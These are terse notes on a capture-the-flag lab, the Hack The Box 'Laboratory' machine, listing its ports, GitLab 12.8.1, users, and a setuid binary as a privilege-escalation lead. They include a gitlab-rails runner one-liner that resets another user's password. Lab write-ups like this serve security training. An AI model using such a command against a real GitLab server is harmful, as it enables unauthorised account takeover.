# laboratory

- ip: 10.10.10.216
- open ports: 22, 80, 443
- OS: `Ubuntu 20.04 LTS`
- git.laboratory.htb: `Linux git.laboratory.htb 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux`
- gitlab version: GitLab Community Edition 12.8.1

## ssh

## web
- hosts: `laboratory.htb`, `git.laboratory.htb`
- login
  - username: `a`
  - password: `a`
  - email: `a@laboratory.htb`

### git.laboratory.htb
- users:
  - `@dexter`
  - `@seven`

```
git@git:~/gitlab-rails/working$ gitlab-rails runner -e production 'u = User.find_by(username: "dexter"); u.password="aaaaaaaa"; u.password_confirmation="aaaaaaaa"; u.save;'
<u.password="aaaaaaaa"; u.password_confirmation="aaaaaaaa"; u.save;'
```

```
challenge
permitroot
password
```

### privesc

```
-rwsr-xr-x 1 root dexter 16720 Aug 28  2020 /usr/local/bin/docker-security
```
